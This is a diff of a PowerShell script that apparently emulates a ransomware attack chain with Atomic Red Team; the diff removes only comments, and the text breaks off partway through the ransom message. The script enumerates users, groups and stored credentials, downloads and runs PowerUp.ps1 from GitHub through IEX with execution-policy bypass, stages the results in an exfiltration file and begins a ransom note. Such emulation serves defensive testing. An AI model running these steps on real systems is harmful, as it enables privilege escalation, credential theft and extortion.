@@ -1,10 +1,7 @@
-# Import module
 Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
 
-# Removable media inserted
 Invoke-AtomicTest T1091
 
-# Windows enumeration outputing to file
 net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
@@ -15,15 +12,11 @@ net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 
-
-#Powerup checking for priv esculation outputing to file
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\temp\Powerup.txt"
 
-# Taking enumeration data and performing Exfil
 Invoke-AtomicTest T1020
 Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\T1020_exfilFile.txt
 
-# Ransom Attack Starts
 Echo "Ooops, your files have been encrypted! 
 
 What Happened to My Computer? 
